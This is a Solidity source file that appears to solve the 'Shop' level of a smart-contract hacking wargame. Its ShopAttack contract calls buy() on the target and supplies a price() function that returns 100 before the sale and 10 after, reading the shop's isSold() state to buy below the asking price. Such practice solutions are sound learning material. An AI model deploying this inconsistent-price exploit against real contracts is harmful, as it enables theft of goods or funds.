// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Helper/Broadcasted.sol";

contract ShopAttack is Broadcasted {
    address private s_shop;
    uint256 internal constant BALANCE = 100;
    uint256 internal constant SMALLER_BALANCE = 10;

    function attack(address payable shopCtr_) public payable override {
        IShop(shopCtr_).buy();
    }

    function broadcastedAttack(
        address payable levelInstanceCtr_
    ) external payable override {
        // intentionally not broadcasted to make the call from this contract
        _setShop(levelInstanceCtr_);
        attack(levelInstanceCtr_);
    }

    function price() external view returns (uint) {
        if (!IShop(s_shop).isSold()) {
            return BALANCE;
        } else {
            return SMALLER_BALANCE;
        }
    }

    function _setShop(address shop_) private {
        s_shop = shop_;
    }
}

interface IShop {
    //! to hack this level have to have a function that returns price depending on if the object is sell or not
    function isSold() external view returns (bool);

    function buy() external;
}
